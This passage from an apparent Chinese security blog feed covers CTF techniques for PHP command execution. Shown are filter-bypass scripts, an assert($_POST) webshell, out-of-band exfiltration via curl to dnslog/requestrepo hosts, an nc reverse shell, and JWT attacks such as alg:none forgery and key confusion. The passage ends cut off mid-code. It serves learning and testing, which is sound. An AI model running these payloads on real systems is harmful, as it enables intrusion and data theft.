class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                        <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>                &#125;<br>        &#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><p>然后用<code>($a)();</code>的形式执行代码即可，但是要注意<code>PHP7</code>前是不允许用<code>($a)();</code>这样的方法来执行动态函数的</p><p>补充：<code>PHP&gt;8</code>就不支持将没有引号包裹的字符解析为对应字符串了，<code>xx^yy</code>-&gt;<code>&#39;xx&#39;^&#39;yy&#39;</code>，这里<code>x  y</code>代表<code>ascii</code>大于<code>128</code>的值</p><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>例子</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">8C</span></span>-10001100<br>逐位取反<br><span class="hljs-tag">%<span class="hljs-selector-tag">73</span></span>-01110011<br></code></pre></td></tr></table></figure><p>利用php的取反符号<code>~</code>来构造任意字母</p><p>yu师傅脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//在命令行中运行</span><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your function: &#x27;</span>);<br><span class="hljs-variable">$system</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN));<br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your command: &#x27;</span>);<br><span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;[*] (~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$system</span>).<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$command</span>).<span class="hljs-string">&#x27;);&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="或or"><a href="#或or" class="headerlink" title="或or"></a>或or</h3><p>原理与异或一致，利用符号<code>|</code>来构造</p><p>或运算就是有一为一，都是零就是零，比如说<code>3|10</code>，就是<code>0011|1010</code>，结果为<code>1011</code></p><p>脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/* author yu22x */</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>                                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br><br>                <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>                <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>                <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                        <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>                &#125;<br>        &#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>利用PHP中的<a href="https://www.php.net/manual/zh/language.operators.increment.php">递增&#x2F;递减运算符</a>，也就是说<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code></p><p>然后利用php强制输出数组时，数组会被转换成字符串<code>Array</code>，拿到<code>A</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/zizeng.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//测试发现7.0.12以上版本不可使用</span><br><span class="hljs-comment">//使用时需要url编码下</span><br><span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br>固定格式 构造出来的 <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[_]);<br>然后post传入   _=<span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></table></figure><p>CTFSHOW无字符RCE挑战中有更深入的利用方法</p><h1 id="无回显情况的几种利用方式"><a href="#无回显情况的几种利用方式" class="headerlink" title="无回显情况的几种利用方式"></a>无回显情况的几种利用方式</h1><p>题目中较常见的是<code>shell_exec</code>函数，与<code>system</code>函数相比，前者没有回显结果</p><h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>当有写入的权限时，可以考虑将结果写到文件中</p><p>例如：<code>ls&gt;1.txt;</code></p><h2 id="dns外带信息"><a href="#dns外带信息" class="headerlink" title="dns外带信息"></a>dns外带信息</h2><p>假设目标没有写的权限，但是出网，就可以考虑使用dns外带信息，常用的平台有<code>http://dnslog.cn/</code></p><p>例如我们生成一个域名<code>c9n9j5.dnslog.cn</code>，然后在靶机上执行<code>curl `whoami`.c9n9j5.dnslog.cn</code></p><p>刷新后就会在平台上返回结果</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/dnslog.png"></p><h2 id="http外带信息"><a href="#http外带信息" class="headerlink" title="http外带信息"></a>http外带信息</h2><p>实际上在dnslog外带信息的同时，有许多不方便之处，比如不支持换行，url中没有的字符不显示等等</p><p>所以可以用http的方式，推荐一个平台<code>https://requestrepo.com/#/</code>，用来接收get，post请求等</p><p>在靶机上执行<code>curl http://mt2dyif2.requestrepo.com/?1=`whoami` </code>，过一会在平台上就会有请求返回(子域名是随机生成的)</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/http.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>不回显的利用方式肯定少不了最经典的反弹shell</p><p>常规反弹语句：<code>nc ip port -e /bin/sh</code>，监听：<code>nc -lvnp port</code></p><p>反弹的姿势非常多，不知道利用什么方式时可以用比较通用的方式<code>https://your-shell.com/</code></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>当靶机不出网，没有写入权限，没有回显时，可以采用类似sql时间盲注的方法</p><p>原理很简单，就是猜字符如果猜中，就延时若干秒，坏处是非常耗时</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;部分题目环境&amp;amp;脚本&amp;amp;姿势来自&lt;code&gt;https://ctf.show/&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;命令执行&quot;&gt;&lt;a href=&quot;#命令执行&quot; class=&quot;headerlink&quot; title=&quot;命令执行&quot;&gt;&lt;/a&gt;命令执行&lt;/h1&gt;&lt;h2 i</summary>
      
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="rce" scheme="https://www.lewiserii.top/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>JWT常见安全问题学习总结</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/JWT%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/JWT%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html</id>
    <published>2023-01-05T02:00:00.000Z</published>
    <updated>2023-02-15T05:17:50.113Z</updated>
    
    <content type="html"><![CDATA[<p>Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准(<a href="https://datatracker.ietf.org/doc/html/rfc7519">RFC 7519</a>)。它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象，特别适用于分布式站点的单点登录(SSO)场景。</p><h1 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h1><p>jwt由三部分组成：<code>header</code>、<code>payload</code>、<code>signature</code>，用点<code>.</code>分隔</p><h2 id="header"><a href="#header" class="headerlink" title="header"></a>header</h2><p><code>header</code>用来声明<code>token</code>的类型和签名用的算法等</p><p>示例</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>经过<code>Base64Url</code>编码后构成了<code>JWT</code>的第一部分</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><code>payload</code>就是存放有效信息的地方</p><p>示例</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1234567890&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;John Doe&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>它的声明有三类：已注册声明（Registered claims），公共声明（public claims）， 私人声明（private claims）</p><p>其中已注册声明有7个默认字段，都由官方所定义(<a href="https://www.rfc-editor.org/rfc/rfc7519#section-4.1">参考rfc7519</a>)，但并不都是必需的</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">iss (issuer)：JWT的发行者<br>exp (expiration time)：过期时间<br>sub (subject)：JWT面向的主题<br>aud (audience)：JWT的用户<br>nbf (Not Before)：生效时间<br>iat (Issued At)：签发时间<br>jti (JWT ID)：JWT唯一标识<br></code></pre></td></tr></table></figure><p><code>公共声明</code>：这些可以由使用JWT的人随意定义。但是为了避免冲突，它们应该在IANA JSON Web令牌注册表中定义，或者定义为包含抗冲突命名空间的 URI。<br><code>私人声明</code>：这些是为在同意使用它们的各方之间共享信息而创建的自定义声明，既不是注册声明也不是公共声明</p><p>经过<code>Base64Url</code>编码后构成了<code>JWT</code>的第二部分</p><h2 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h2><p>签名用于验证消息在此过程中没有被更改</p><p>这个部分需要<code>Base64Url</code>编码后的<code>header</code>和<code>Base64Url</code>编码后的<code>payload</code>使用<code>.</code>连接，组成字符串，然后通过<code>header</code>中声明的加密方式进行加盐<code>secret</code>组合加密，然后就构成了<code>jwt</code>的第三部分</p><p>如果要使用<code>HMAC SHA256</code>算法，将按以下方式创建签名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SHA256">HMACSHA256(<br>  base64UrlEncode(header) + &quot;.&quot; +<br>  base64UrlEncode(payload),<br>  secret)<br></code></pre></td></tr></table></figure><p>secret是保存在服务端的，jwt的签发生成也是在服务端的，secret就是用来进行jwt的签发和jwt的验证，所以一旦客户端得知这个secret, 那就意味着客户端可以自我签发jwt了</p><h1 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h1><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>因为<code>payload</code>和<code>header</code>只经过<code>Base64Url</code>编码，如果开发者把一些敏感信息存放到里面，我们可以轻松获得</p><h2 id="未校验签名"><a href="#未校验签名" class="headerlink" title="未校验签名"></a>未校验签名</h2><p>某些服务端并未校验JWT签名，所以，可以尝试修改<code>signature</code>后(或者直接删除<code>signature</code>)看其是否还有效。</p><h2 id="签名算法置空-CVE-2015-2951"><a href="#签名算法置空-CVE-2015-2951" class="headerlink" title="签名算法置空(CVE-2015-2951)"></a>签名算法置空(CVE-2015-2951)</h2><p>我们知道，签名算法可以确保JWT在传输过程中不会被恶意用户所篡改</p><p>但头部中的<code>alg</code>字段却可以改为<code>none</code>，服务端接收到后会将其认定为无加密算法， 于是对<code>signature</code>的检验也就失效了，那么我们就可以随意修改<code>payload</code>部分伪造<code>token</code></p><p>因为<code>jwt.io</code>将<code>alg</code>为<code>none</code>视为恶意行为，所以无法通过在线工具生成JWT，可以用<code>python</code>的<code>jwt</code>库来实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><br><br>token_dict = &#123;<br>  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1674031091</span>,<br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1674038291</span>,<br>  <span class="hljs-string">&quot;nbf&quot;</span>: <span class="hljs-number">1674031091</span>,<br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;jti&quot;</span>: <span class="hljs-string">&quot;e41ff441b04bf337ab3ca715f64a76e1&quot;</span><br>&#125;<br><br>headers = &#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br><br><br>jwt_token = jwt.encode(token_dict,<br>                       <span class="hljs-string">&quot;&quot;</span>,   <span class="hljs-comment"># 进行加密签名的密钥</span><br>                       algorithm=<span class="hljs-string">&quot;none&quot;</span>,   <span class="hljs-comment"># 指明签名算法方式, 默认也是HS256</span><br>                       headers=headers<br>                       )<br><br><span class="hljs-built_in">print</span>(jwt_token)<br></code></pre></td></tr></table></figure><p>运行结果<br><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3NDAzMTA5MSwiZXhwIjoxNjc0MDM4MjkxLCJuYmYiOjE2NzQwMzEwOTEsInN1YiI6ImFkbWluIiwianRpIjoiZTQxZmY0NDFiMDRiZjMzN2FiM2NhNzE1ZjY0YTc2ZTEifQ.</code></p><h2 id="签名密钥爆破"><a href="#签名密钥爆破" class="headerlink" title="签名密钥爆破"></a>签名密钥爆破</h2><p>JWT使用算法对<code>header</code>和<code>payload</code>进行加密，如果我们可以爆破出加密密钥，那么也就可以随意修改<code>token</code>了</p><p><a href="https://github.com/Ch1ngg/JWTPyCrack">Github-jwt爆破脚本</a></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/jwt/jwt-1.png"></p><h2 id="非对称密码算法-x3D-gt-对称密码算法-CVE-2016-10555"><a href="#非对称密码算法-x3D-gt-对称密码算法-CVE-2016-10555" class="headerlink" title="非对称密码算法&#x3D;&gt;对称密码算法(CVE-2016-10555)"></a>非对称密码算法&#x3D;&gt;对称密码算法(CVE-2016-10555)</h2><p>JWT的签名加密算法有两种，对称加密算法和非对称加密算法</p><p>对称加密算法比如HS256使用密钥为所有消息进行签名和验证<br>非对称加密算法比如RS256使用私钥对消息进行签名并使用公钥进行身份验证</p><p>如果我们获取到了公钥，可以将头部中的算法修改从<code>RS256</code>更改为<code>HS256</code>，这样后端代码就会使用<code>RSA</code>公钥+<code>HS256</code>算法进行签名验证</p><p>js代码实现例子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;public.key&#x27;</span>);<br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span 